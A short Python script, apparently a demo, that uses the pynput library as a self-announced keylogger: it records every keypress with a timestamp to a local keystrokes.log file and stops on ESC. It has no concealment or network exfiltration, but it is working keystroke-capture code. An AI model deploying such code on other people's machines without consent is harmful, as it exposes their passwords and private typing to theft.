import time
import threading
from pynput.keyboard import Listener

keystrokes = []
running = True


def capture_key(key):
    global running
    key_data = str(key).replace("'", "")
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

    log_entry = f"[{timestamp}] -> {key_data}"
    keystrokes.append(log_entry)

    with open("keystrokes.log", "a") as log:
        log.write(log_entry + "\n")

    if key_data == "Key.esc":
        running = False
        return False


def start_logging():
    global running
    print("Keylogger is active... (Press ESC to stop)")

    listener = Listener(on_press=capture_key)
    listener.start()

    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        running = False

    listener.stop()
    print("\nLogging stopped.\nCaptured Keystrokes:")
    for entry in keystrokes:
        print(entry)


if __name__ == "__main__":
    start_logging()
